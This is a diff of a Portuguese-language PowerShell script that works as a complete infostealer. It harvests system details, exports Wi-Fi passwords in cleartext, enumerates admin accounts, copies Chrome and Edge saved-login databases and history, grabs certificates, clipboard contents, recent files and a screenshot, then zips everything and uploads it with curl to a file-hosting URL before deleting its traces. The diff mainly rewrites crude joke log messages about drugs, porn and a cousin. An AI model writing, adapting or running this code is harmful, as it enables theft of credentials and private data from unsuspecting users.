@@ -1,4 +1,4 @@
-# ---------- KIT v7.0 – “Festa do Coringa” ----------
+# ---------- KIT v9.0 – “Só Log, Sem Emoji” ----------
 $ErrorActionPreference = "Stop"
 $kit     = "$env:TEMP\kit"
 $key     = "AFtru5qQZX8HN5npouThcNDJtVbe6d"
@@ -12,31 +12,27 @@ function Write-Log ($msg) {
     "$ts  $msg" | Tee-Object -FilePath $logFile -Append
 }
 
-# 0) Garante 7za.exe
 if (!(Test-Path $7z)) {
-    Write-Log "🍺 [Balada] $user, pera aí que vou pegar o 7za.exe no bar..."
+    Write-Log "[PontoDeGolpe] $user ainda nao tem 7za.exe, indo buscar no beco..."
     Invoke-WebRequest "https://www.7-zip.org/a/7za920.zip" -OutFile "$env:TEMP\7za920.zip"
     Expand-Archive "$env:TEMP\7za920.zip" "$env:TEMP" -Force
     Move-Item "$env:TEMP\7za.exe" $7z -Force
 }
 
-Write-Log "🎉 [OnlyFans] $user acabou de abrir a live privada em $env:COMPUTERNAME"
+Write-Log "[CasaDaVovó] $user acabou de chegar na festa em $env:COMPUTERNAME"
 New-Item -ItemType Directory -Path $kit -Force | Out-Null
 
-# 1) Sistema & HW
-Write-Log "🌿 [MaconhaLand] $user, vou verificar se seu PC fuma mais que você..."
+Write-Log "[DealerCheck] $user, vendo se vende drogas no Discord ou só rouba wi-fi..."
 systeminfo | Out-File "$kit\sysinfo.txt" -Encoding UTF8
 Get-CimInstance Win32_ComputerSystem | Out-File "$kit\hw.txt" -Encoding UTF8
 Get-CimInstance Win32_Processor | Out-File "$kit\cpu.txt" -Encoding UTF8
 Get-CimInstance Win32_BIOS | Out-File "$kit\bios.txt" -Encoding UTF8
 
-# 2) Rede & Wi-Fi
-Write-Log "📡 [CrackNet] $user, exportando Wi-Fi da vizinha que nunca pagou internet..."
+Write-Log "[VizHotSpot] $user, exportando senha da vizinha que nunca fecha a janela..."
 Get-NetIPConfiguration | Out-File "$kit\netip.txt" -Encoding UTF8
 cmd /c "netsh wlan export profile key=clear folder=$kit"
 
-# 3) Contas & privilégios
-Write-Log "👮 [Narcocheck] $user, fuçando admins pra ver quem vende o controle do Xbox..."
+Write-Log "[PrimaTracker] $user, verificando se já comeu a prima no feriado de 7 de setembro..."
 Get-CimInstance Win32_UserAccount | Out-File "$kit\users.txt" -Encoding UTF8
 net localgroup administradores | Out-File "$kit\admins.txt" -Encoding UTF8
 $secLog = Get-WinEvent -ListLog Security -EA SilentlyContinue
@@ -48,8 +44,7 @@ if ($secLog -and $secLog.RecordCount) {
     "Log Security trancado com cadeado do tráfico" | Out-File "$kit\logons.txt" -Encoding UTF8
 }
 
-# 4) Navegadores
-Write-Log "🍑 [PornHub] $user, vasculhando aba anônima que você jurou que era ‘trabalho’..."
+Write-Log "[IncognitoHunter] $user, fuçando aba anônima que você jurou ser ‘trabalho’..."
 @(
     "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
     "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
@@ -57,24 +52,20 @@ Write-Log "🍑 [PornHub] $user, vasculhando aba anônima que você jurou que er
     "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
 ) | ?{ Test-Path $_ } | %{ Copy-Item $_ "$kit\$(Split-Path -Leaf $_)-$(Get-Random).db" -EA SilentlyContinue }
 
-# 5) Certificados
-Write-Log "💳 [CartelByte] $user, exportando certificados de site de delivery de erva..."
+Write-Log "[ExFile] $user, vendo se ainda salva foto da ex na pasta ‘Arquivos Importantes’..."
 Get-ChildItem Cert:\CurrentUser\My |
     Select Subject,Thumbprint,NotAfter |
     Out-File "$kit\mycerts.txt" -Encoding UTF8
 
-# 6) Clipboard
-Write-Log "📝 [BocaDeFumo] $user, lendo última receita de brownie que você copiou..."
+Write-Log "[Papinho] $user, lendo última cantada copiada pro crush..."
 Get-Clipboard | Out-File "$kit\clipboard.txt" -Encoding UTF8
 
-# 7) Recentes
-Write-Log "🗂️ [DealerDocs] $user, listando arquivos recentes (até aquele chamado ‘receita.pptx’)..."
+Write-Log "[VergonhaAlheia] $user, listando arquivos que abriu e depois apagou com vergonha..."
 Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -EA SilentlyContinue |
     Select Name,LastWriteTime |
     Out-File "$kit\recent.txt" -Encoding UTF8
 
-# 8) Screenshot
-Write-Log "📸 [SnapFoda] $user, tirando print antes que você minimize a aba ‘como plantar cannabis’..."
+Write-Log "[PrintFoda] $user, screenshot antes que minimize a aba ‘como plantar cannabis’..."
 Add-Type -AssemblyName System.Windows.Forms
 $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
 $bmp = New-Object System.Drawing.Bitmap($screen.Width,$screen.Height)
@@ -85,39 +76,42 @@ $bmp.Save($pathSS,[System.Drawing.Imaging.ImageFormat]::Jpeg)
 $g.Dispose(); $bmp.Dispose()
 [System.GC]::Collect(); Start-Sleep -Milliseconds 200
 
-# 9) Compactação 7Z com logs fake
-Write-Log "🗜️ [Compressolandia] $user, prensando a erva digital..."
+Write-Log "[PrensaLow] $user, prensando a paranga digital..."
 Start-Sleep -Seconds 1
-Write-Log "🧂 [PrenSertanejo] $user, adicionando fotos da ex fumando..."
+Write-Log "[Baseado] $user, adicionando pasta ‘Sementes 2026’ no meio..."
 Start-Sleep -Seconds 1
-Write-Log "🌬️ [Vaporwave] $user, ocultando pasta ‘Sementes 2026’..."
+Write-Log "[DrySafe] $user, ocultando print da tela que tem onlyfans aberto..."
+Start-Sleep -Seconds 1
+Write-Log "[PontoFinal] $user, fechando o baseado com filtro duplo..."
 $arc = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).7z"
 & $7z a -t7z -mx=9 -y $arc "$kit\*" | Out-Null
 
 if (Test-Path $arc) {
     $size = (Get-Item $arc).Length
-    Write-Log "✅ [Vaporizou] $user, beck pronto: $arc ($size bytes)"
+    Write-Log "[BeckPronto] $user, arquivo criado: $arc ($size bytes)"
 } else {
-    Write-Log "❌ [ErroDeBong] $user, o baseado caiu no chão – arquivo 7z falhou"
+    Write-Log "[ErroDeBong] $user, o beck caiu no chão – 7z falhou"
     exit 1
 }
 
-# 10) Upload
-Write-Log "🚀 [TraficoCloud] $user, fazendo o corre pro AnonFiles..."
+Write-Log "[BocaDeFumo] $user, fazendo o corre pro AnonFiles..."
+Start-Sleep -Seconds 1
+Write-Log "[AviaoDoTráfico] $user, subindo pacote pro nuvens..."
+Start-Sleep -Seconds 1
+Write-Log "[PontoDeEntrega] $user, chegando no endereço errado certo..."
 try {
     $curl = 'curl.exe -s -X POST -F "file=@' + $arc + '" ' + $upUrl
     $reply = cmd /c $curl
     Write-Log "[UP] Resposta: $reply"
     if ($reply -match '"full":"([^"]+)"') {
-        Write-Log "🤑 [Entregue] $user, o baseado chegou – link: $($matches[1])"
+        Write-Log "[Entregue] $user, o beck chegou – link: $($matches[1])"
     } else {
-        Write-Log "😵 [Biqueira] $user, a boca foi descoberta – falha na URL"
+        Write-Log "[BiqueiraFechada] $user, a boca foi descoberta – falha na URL"
     }
 } catch {
-    Write-Log "🤯 [Overdose] $user, deu ruim no upload: $_"
+    Write-Log "[Overdose] $user, deu ruim no upload: $_"
 }
 
-# 11) Limpeza
-Write-Log "🧹 [DealerClean] $user, limpando cinza e palitinho da área..."
+Write-Log "[DealerClean] $user, limpando cinza e palitinho da área..."
 Remove-Item $kit,$arc -Recurse -Force -EA SilentlyContinue
-Write-Log "🏁 [FimDaFesta] $user, a rave acabou – log em $logFile"
+Write-Log "[FimDaFesta] $user, a rave acabou – log em $logFile"
